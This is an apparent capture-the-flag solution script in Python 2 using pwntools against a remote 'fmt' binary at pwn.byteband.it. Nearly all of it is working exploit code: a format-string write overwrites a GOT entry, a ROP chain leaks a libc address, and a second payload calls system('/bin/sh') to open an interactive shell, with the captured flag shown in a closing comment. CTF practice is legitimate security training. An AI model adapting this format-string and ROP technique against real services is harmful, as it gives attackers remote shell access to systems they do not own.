"""
nc pwn.byteband.it 6969
"""
from pwn import *
import time
import ctypes


DEBUG = True
#DEBUG = False

context.update(arch="amd64", os="linux", bits=64)


if __name__ == "__main__":
    elf = ELF("./fmt")
    if DEBUG:
        p = process("./fmt")
    else:
        p = remote("pwn.byteband.it", 6969)

    got_system = 0x404028
    got_puts = 0x404018
    puts_addr = 0x401030
    ret = 0x401374
    max_pr = 0x401366
    set_rdi_pr = 0x401373

    other_buf = 0x4040A0
    main = 0x4011F7

    ### first round
    p.sendafter("Choice:", "2\n")

    # overwrite got system with pop-ret sequence to jump to an offset in the format string on the stack
    # use ROP to puts(got_puts), return to main 16-byte alligned
    fmt = "% "+str(max_pr)+"c%8$n"
    fmt += "\x41"*(16-len(fmt))
    fmt += p64(got_system)
    fmt += "B"*8
    fmt += p64(set_rdi_pr)
    fmt += p64(got_puts)
    fmt += p64(puts_addr)
    fmt += p64(ret)
    fmt += p64(main)

    print "fmt string:",`fmt`
    p.sendafter("gift.\n", fmt)

    # receive address of puts and calculate system offset
    r = p.recvuntil("\n")
    libc_puts = u64(r[:-1]+"\x00"*(8-len(r[:-1])))
    print "Libc puts:",hex(libc_puts)
    libc_system = libc_puts - 0x31580
    print "Libc system:",hex(libc_system)


    ### second round
    p.sendafter("Choice:", "2\n")

    # use ROP to return to return to system('/bin/sh')
    fmt = "/bin/sh"
    fmt += "% "+str(max_pr-len(fmt))+"c%9$n"
    fmt += "\x41"*(24-len(fmt))
    fmt += p64(got_system)
    fmt += p64(set_rdi_pr)
    fmt += p64(other_buf)
    fmt += p64(libc_system)
    fmt += p64(ret)
    fmt += p64(main)

    print "fmt string:",`fmt`
    p.sendafter("gift.\n", fmt)


    p.interactive()
    p.close()
"""
$ cat flag.txt
flag{format_string_is_t00_0ld}
"""